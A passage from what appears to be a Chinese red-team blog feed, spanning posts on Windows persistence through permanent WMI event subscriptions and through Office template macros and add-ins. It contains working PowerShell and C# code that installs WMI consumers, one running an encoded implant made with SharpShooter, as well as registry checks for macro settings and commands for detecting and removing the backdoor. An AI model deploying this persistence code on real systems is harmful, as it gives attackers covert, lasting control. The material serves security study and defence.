class="keyword">CONSTRAINT</span>]&gt;</span><br></pre></td></tr></table></figure><ul><li><p>用于登陆时都会触发此事件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> __InstanceCreationEvent <span class="keyword">WITHIN</span> <span class="number">15</span> <span class="keyword">WHERE</span> TargetInstanceISA <span class="string">'Win32_LogonSession'</span> <span class="keyword">AND</span> TargetInstance.LogonType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次用户在插入可移除设备时都会触发此事件：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Win32_VolumeChangeEvent <span class="keyword">Where</span> EventType=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>每次创建 win32 进程时都会触发此事件：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Select</span> * <span class="keyword">From</span> <span class="variable">__InstanceCreationEvent</span> Where TargetInstance Isa <span class="string">"Win32_Process"</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="1-3-Meta-Queries"><a href="#1-3-Meta-Queries" class="headerlink" title="1.3 Meta Queries"></a>1.3 Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。</p><ul><li><p>格式如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT [Class property name | *] <span class="keyword">FROM</span> [Meta_Class |<span class="built_in"> SYSTEM </span>CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</span><br></pre></td></tr></table></figure></li><li><p>下面这个语句会查询所有以 <code>WIN32</code> 开头的WMI的类：<br><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p></li><li>下面这个语句会查询某个命名空间下的所有命名空间：<br><code>SELECT Name FROM __NAMESPACE</code></li></ul><p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p><h2 id="0x02-与WMI交互"><a href="#0x02-与WMI交互" class="headerlink" title="0x02 与WMI交互"></a>0x02 与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。</p><p>下面是部分工具的一个不完全的列表</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、PowerShell</span><br><span class="line">2、wmic.exe</span><br><span class="line">3、wbemtest.exe</span><br><span class="line">4、WMI Explorer</span><br><span class="line">5、CIM Studio</span><br><span class="line">6、Windows<span class="built_in"> Script </span>Host (WSH) languages</span><br><span class="line">7、C/C++ via IWbem* COM API</span><br><span class="line">8、.NET using System.Management classes</span><br><span class="line">9、winrm.exe</span><br></pre></td></tr></table></figure><h2 id="0x03-WMI事件"><a href="#0x03-WMI事件" class="headerlink" title="0x03 WMI事件"></a>0x03 WMI事件</h2><p>WMI事件分两类，包括<code>本地事件</code>（运行在本地上下文环境当中的单个进程的事件）和<code>永久性WMI事件订阅</code>。</p><p>本地事件有生命周期为进程宿主的周期，而永久性 WMI事件 是存储在WMI库中，以 SYSTEM 权限运行，并且重启后依然存在。</p><h3 id="3-1-前置条件"><a href="#3-1-前置条件" class="headerlink" title="3.1 前置条件"></a>3.1 前置条件</h3><p>为了能够安装一个<code>永久性的 WMI 事件订阅</code>，必须满足两个条件：</p><ul><li>一个 <code>__EventFilter</code> 查询，它创建一个过滤器，为我们的特定事件选择触发器;</li><li><a href="https://docs.microsoft.com/en-gb/windows/desktop/WmiSdk/standard-consumer-classes" target="_blank" rel="noopener">Event Consumer Class</a>，代表一个事件触发时所执行的操作。</li></ul><p>在 <code>Event Consumers</code>（事件处理）中，可用的标准事件处理类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LogFileEventConsumer： 将事件数据写入到指定的日志文件</span><br><span class="line">ActiveScriptEventConsumer： 用来执行VBScript/JScript程序</span><br><span class="line">NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</span><br><span class="line">SMTPEventConsumer：将事件数据用邮件发送</span><br><span class="line">CommandLineEventConsumer：执行一条命令</span><br></pre></td></tr></table></figure></p><p>利用点</p><ul><li><code>ActiveScriptEventConsumer</code>，允许执行任意脚本（支持 <code>JScript</code> 和 <code>VBScript</code> 引擎）</li><li><code>CommandLineEventConsumer</code>，允许执行任意命令</li></ul><h3 id="3-2-测试"><a href="#3-2-测试" class="headerlink" title="3.2 测试"></a>3.2 测试</h3><p>使用以下查询进行测试：</p><p><code>Select * From __InstanceCreationEvent Where TargetInstance Isa &quot;Win32_Process&quot;</code></p><p>为了方便测试，此处使用 <code>Powershell 的 Register-WMIEvent</code> 安装触发器。</p><p><img src="/image/永久性 WMIC 事件订阅 - 权限维持（三）/blog_2019-05-30_11-42-33.png" alt="blog_2019-05-30_11-42-33"></p><p>以上测试不符合实际需求。</p><h3 id="3-3-Powershell-实例（命令执行）"><a href="#3-3-Powershell-实例（命令执行）" class="headerlink" title="3.3 Powershell 实例（命令执行）"></a>3.3 Powershell 实例（命令执行）</h3><p>下面的 <code>PowerShell</code> 代码来自一个叫 <code>SEADADDY</code> 的恶意软件的修改版，用来通过<code>WMI做持久化</code>的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilterName</span> = <span class="string">'BotFilter11'</span></span><br><span class="line"><span class="variable">$EventConsumerName</span> = <span class="string">'BotConsumer22'</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$EventFilterArgs</span> = @&#123;</span><br><span class="line">EventNamespace = <span class="string">'root\cimv2'</span></span><br><span class="line">Name = <span class="variable">$EventFilterName</span></span><br><span class="line">Query = <span class="string">'Select * From __InstanceCreationEvent Where TargetInstance Isa "Win32_Process"'</span></span><br><span class="line">QueryLanguage=<span class="string">"WQL"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilter</span> = <span class="built_in">Set-WmiInstance</span> -NameSpace <span class="string">'root\subscription'</span> -Class __EventFilter -Arguments <span class="variable">$EventFilterArgs</span> -ErrorAction Stop</span><br><span class="line"></span><br><span class="line"><span class="variable">$CommandLineumerArgs</span> =@&#123;</span><br><span class="line">        Name=<span class="variable">$EventConsumerName</span></span><br><span class="line">CommandLineTemplate=<span class="string">'C:\Windows\System32\calc.exe'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventConsumer</span> = <span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class CommandLineEventConsumer -Arguments <span class="variable">$CommandLineumerArgs</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$WMIEventFilterToConsumerArgs</span> = @&#123;</span><br><span class="line"><span class="keyword">Filter</span>=<span class="variable">$WMIEventFilter</span></span><br><span class="line">Consumer=<span class="variable">$WMIEventConsumer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> -Namespace <span class="string">'root\subscription'</span> -Class __FilterToConsumerBinding -Arguments <span class="variable">$WMIEventFilterToConsumerArgs</span></span><br></pre></td></tr></table></figure><p>但是这里实测失败，就算使用<code>C#</code>去添加 <code>CommandLineEventConsumer</code> 也是失败的，但是 <code>LogFileEventConsumer</code> 可成功。</p><h3 id="3-4-C-实例（代码执行）"><a href="#3-4-C-实例（代码执行）" class="headerlink" title="3.4 C# 实例（代码执行）"></a>3.4 C# 实例（代码执行）</h3><p>本示例执行的是 <code>VBScript</code></p><p>使用<code>SharpShooter</code>生成 <code>VBSceipt</code> 类型的 <code>payload</code>。<em>友情提示：一定要生成 64位的 payload。</em></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; python SharpShooter.py --stageless --dotnetver <span class="number">2</span> --payload vbs --output implantvbs --rawscfile payload64.bin</span><br><span class="line"></span><br><span class="line">       _____ __                    _____ __                __           </span><br><span class="line">      <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____ __________ <span class="regexp">/ ___/</span><span class="regexp">/ /</span>_  ____  ____  <span class="regexp">/ /</span>____  _____</span><br><span class="line">      \__ \<span class="regexp">/ __ \/</span> __ `<span class="regexp">/ ___/</span> __ \__ \<span class="regexp">/ __ \/</span> __ \<span class="regexp">/ __ \/</span> __<span class="regexp">/ _ \/</span> ___/</span><br><span class="line">     ___<span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/  /</span> <span class="regexp">/_/</span> <span class="regexp">/__/</span> <span class="regexp">/ /</span> <span class="regexp">/ /</span> <span class="regexp">/_/</span> <span class="regexp">/ /</span>_<span class="regexp">/ /</span> <span class="regexp">/_/</span>  __<span class="regexp">/ /</span>    </span><br><span class="line">    <span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\__,_/</span>_<span class="regexp">/  /</span> .___<span class="regexp">/____/</span>_<span class="regexp">/ /</span>_<span class="regexp">/\____/\_</span>___<span class="regexp">/\__/\_</span>__<span class="regexp">/_/</span>     </span><br><span class="line">                         <span class="regexp">/_/</span>                                            </span><br><span class="line"></span><br><span class="line">     Dominic Chell, <span class="meta">@domchell</span>, MDSec ActiveBreach, v2<span class="number">.0</span></span><br><span class="line">    </span><br><span class="line">[*] Written delivery payload to output/implantvbs.vbs</span><br><span class="line">运行vbs，成功上线，再进行 base64 编码</span><br><span class="line">&gt; base64 -i output/implantvbs.vbs &gt;&gt;implantvbs-base64.txt</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">// WMI Event Subscription Peristence Demo</span><br><span class="line">// Author: @domchell</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Management;</span><br><span class="line"></span><br><span class="line">namespace WMIPersistence</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            PersistWMI();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void PersistWMI()</span><br><span class="line">        &#123;</span><br><span class="line">            ManagementObject myEventFilter = null;</span><br><span class="line">            ManagementObject myEventConsumer = null;</span><br><span class="line">            ManagementObject myBinder = null;</span><br><span class="line"></span><br><span class="line">            string vbscript64 = &quot;&lt;INSIDE base64 encoded VBS here&gt;&quot;;</span><br><span class="line">            string vbscript = Encoding.UTF8.GetString(Convert.FromBase64String(vbscript64));</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                ManagementScope scope = new ManagementScope(@&quot;\\.\root\subscription&quot;);</span><br><span class="line"></span><br><span class="line">                ManagementClass wmiEventFilter = new ManagementClass(scope, new</span><br><span class="line">                ManagementPath(&quot;__EventFilter&quot;), null);</span><br><span class="line">                String strQuery = @&quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 &quot; +            </span><br><span class="line">        &quot;WHERE TargetInstance ISA \&quot;Win32_Process\&quot; &quot; +           </span><br><span class="line">        &quot;AND TargetInstance.Name = \&quot;notepad.exe\&quot;&quot;;</span><br><span class="line"></span><br><span class="line">                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);</span><br><span class="line">                myEventFilter = wmiEventFilter.CreateInstance();</span><br><span class="line">                myEventFilter[&quot;Name&quot;] = &quot;demoEventFilter&quot;;</span><br><span class="line">                myEventFilter[&quot;Query&quot;] = myEventQuery.QueryString;</span><br><span class="line">                myEventFilter[&quot;QueryLanguage&quot;] = myEventQuery.QueryLanguage;</span><br><span class="line">                myEventFilter[&quot;EventNameSpace&quot;] = @&quot;\root\cimv2&quot;;</span><br><span class="line">                myEventFilter.Put();</span><br><span class="line">                Console.WriteLine(&quot;[*] Event filter created.&quot;);</span><br><span class="line"></span><br><span class="line">                myEventConsumer =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;ActiveScriptEventConsumer&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myEventConsumer[&quot;Name&quot;] = &quot;BadActiveScriptEventConsumer&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptingEngine&quot;] = &quot;VBScript&quot;;</span><br><span class="line">                myEventConsumer[&quot;ScriptText&quot;] = vbscript;</span><br><span class="line">                myEventConsumer.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Event consumer created.&quot;);</span><br><span class="line"></span><br><span class="line">                myBinder =</span><br><span class="line">                new ManagementClass(scope, new ManagementPath(&quot;__FilterToConsumerBinding&quot;),</span><br><span class="line">                null).CreateInstance();</span><br><span class="line">                myBinder[&quot;Filter&quot;] = myEventFilter.Path.RelativePath;</span><br><span class="line">                myBinder[&quot;Consumer&quot;] = myEventConsumer.Path.RelativePath;</span><br><span class="line">                myBinder.Put();</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(&quot;[*] Subscription created&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e);</span><br><span class="line">            &#125; // END CATCH</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125; // END FUNC</span><br><span class="line">    &#125; // END CLASS</span><br><span class="line">&#125; // END NAMESPACE</span><br></pre></td></tr></table></figure><p>管理员权限运行生成的exe，<strong>演示 GIF</strong></p><p><img src="/image/永久性 WMIC 事件订阅 - 权限维持（三）/blog_2019-05-29_11-42-33.gif" alt="blog_2019-05-29_11-42-33"></p><h2 id="0x04-WMI后门检测及清除"><a href="#0x04-WMI后门检测及清除" class="headerlink" title="0x04 WMI后门检测及清除"></a>0x04 WMI后门检测及清除</h2><h3 id="4-1-Sysmon日志"><a href="#4-1-Sysmon日志" class="headerlink" title="4.1 Sysmon日志"></a>4.1 Sysmon日志</h3><p>略….</p><h3 id="4-2-查看当前WMI-Event"><a href="#4-2-查看当前WMI-Event" class="headerlink" title="4.2 查看当前WMI Event"></a>4.2 查看当前WMI Event</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#List Event Filters</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Consumers</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventConsumer</span><br><span class="line"></span><br><span class="line"><span class="meta">#List Event Bindings</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding</span><br></pre></td></tr></table></figure><h3 id="4-3-清除后门"><a href="#4-3-清除后门" class="headerlink" title="4.3 清除后门"></a>4.3 清除后门</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#Filter</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __EventFilter -Filter <span class="string">"Name='BotFilter82'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Consumer</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> CommandLineEventConsumer -Filter <span class="string">"Name='BotConsumer23'"</span> | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line"><span class="meta">#Binding</span></span><br><span class="line"><span class="keyword">Get</span>-WMIObject -<span class="keyword">Namespace</span> root\Subscription -<span class="keyword">Class</span> __FilterToConsumerBinding -Filter <span class="string">"__Path LIKE '%BotFilter82%'"</span> | Remove-WmiObject -Verbose</span><br></pre></td></tr></table></figure><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 3 – WMI Event Subscription</a><br><a href="https://wooyun.x10sec.org/static/drops/tips-8189.html" target="_blank" rel="noopener">WMI Attacks</a><br><a href="https://4hou.win/wordpress/?p=17080" target="_blank" rel="noopener">利用WMI构建无文件后门（基础篇）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第三次说明。&lt;/p&gt;
&lt;p&gt;与之前的文章不同，这个操作需要管理员权限。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>Microsoft Office - 权限维持（一）</title>
    <link href="https://rcoil.me/2019/05/Microsoft%20Office%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://rcoil.me/2019/05/Microsoft Office - 权限维持（一）/</id>
    <published>2019-05-29T10:52:59.000Z</published>
    <updated>2019-06-12T07:42:15.197Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第一次说明。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间有过个需求，判断 <code>Office</code>是否开启宏，索性将 <a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a> 中有关 <code>Office</code> 的记录也在后文写一下。</p><ul><li>判断是否安装了 <code>Microsoft Office</code></li><li>判断是否开启了 <code>宏</code></li><li>相关利用</li></ul><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows <span class="number">7</span> Ultimate x64</span><br><span class="line">- Office <span class="number">2007</span>（实际环境）</span><br><span class="line">- Office <span class="number">2010</span>（测试环境）</span><br><span class="line">- Office <span class="number">2013</span>（测试环境）</span><br><span class="line">- Office <span class="number">2016</span>（测试环境）</span><br></pre></td></tr></table></figure><h2 id="0x02-相关判断"><a href="#0x02-相关判断" class="headerlink" title="0x02 相关判断"></a>0x02 相关判断</h2><ul><li><p><code>VBAWarnings</code> 键值数值数据说明</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">1:启用所有宏</span></span><br><span class="line"><span class="section">2:禁用所有宏并发出通知</span></span><br><span class="line"><span class="section">3:禁用无数字部署的所有宏</span></span><br><span class="line"><span class="section">4:禁用所有宏并且不通知</span></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// 通过注册表检测 Office 是否开启宏</span><br><span class="line">        private static void OfficeVBAWarnings(string OfficeVersion)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;string&gt; OfficeFeatures = new List&lt;string&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Excel&quot;, &quot;Word&quot;, &quot;PowerPoint&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (string Features in OfficeFeatures)</span><br><span class="line">            &#123;</span><br><span class="line">                string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\&quot; + Features + @&quot;\Security&quot;;</span><br><span class="line">                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">                if (registryKey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    string[] ValueNames = registryKey.GetValueNames();</span><br><span class="line">                    if (registryKey.ValueCount == 0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(&quot;  [&gt;] &#123;0&#125; VBAWarnings: 2&quot;, Features);</span><br><span class="line">                    &#125;</span><br><span class="line">                    else</span><br><span class="line">                    &#123;</span><br><span class="line">                        foreach (string KeyName in ValueNames)</span><br><span class="line">                        &#123;</span><br><span class="line">                            object VBAWarnings = registryKey.GetValue(&quot;VBAWarnings&quot;);</span><br><span class="line">                            Console.WriteLine(&quot;  [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;&quot;, Features, VBAWarnings);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 通过注册表检测 Office 版本</span><br><span class="line">        private static void OfficeIsInstall(string OfficeVersion)</span><br><span class="line">        &#123;</span><br><span class="line">            string basekey = @&quot;SOFTWARE\Microsoft\Office\&quot; + OfficeVersion + @&quot;\Common\InstallRoot&quot;;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            if (registryKey != null)</span><br><span class="line">            &#123;</span><br><span class="line">                if (registryKey.GetValue(&quot;Path&quot;) != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;  [&gt;] Microsoft Office Version: &#123;0&#125;&quot;, OfficeVersion);</span><br><span class="line">                    OfficeVBAWarnings(OfficeVersion);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;string&gt; OfficeVersions = new List&lt;string&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;8.0&quot;, &quot;9.0&quot;, &quot;10.0&quot;, &quot;11.0&quot;, &quot;12.0&quot;, &quot;14.0&quot;, &quot;15.0&quot;, &quot;16.0&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (string OfficeVersion in OfficeVersions)</span><br><span class="line">            &#123;</span><br><span class="line">                OfficeIsInstall(OfficeVersion);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-Office-模板宏"><a href="#0x03-Office-模板宏" class="headerlink" title="0x03 Office 模板宏"></a>0x03 Office 模板宏</h2><p>每次 <code>Office</code> 程序启动时都会加载使用 <code>Office</code> 程序中的基本模板。</p><p><em>相关位置</em></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Word Normal.dotm位置：</span><br><span class="line">C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>emplates<span class="symbol">\N</span>ormal.dotm</span><br><span class="line"></span><br><span class="line">Excel Personal.xlsb位置：C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>xcel<span class="symbol">\X</span>LSTART<span class="symbol">\P</span>ERSONAL.XLSB</span><br></pre></td></tr></table></figure><p><em>这一部分在倾旋的博客有提到</em></p><p>新建宏名字 –&gt; <code>word</code> 为<em>AutoOpen</em>， <code>Excel</code> 为<em>Auto_Open</em></p><p>使用 <code>GIF</code> 进行演示（Excel 同理）</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-27_22-32-49.gif" alt="Blog_2019-05-27_22-32-49.png"></p><p>本地使用相对应的 <code>Office</code> 版本生成的全局宏，替换目标机器对应的 <code>Office</code> 版本的全局宏，可行。</p><h2 id="0x04-Office-加载项"><a href="#0x04-Office-加载项" class="headerlink" title="0x04 Office  加载项"></a>0x04 Office  加载项</h2><p><code>Office</code> 中支持不同类型的加载项，从本质上来讲，<code>Office</code> 套装有很多受信任的位置，当放置库文件时，在打开 <code>Office</code> 程序时，会自动加载库文件。在 <code>Office</code> 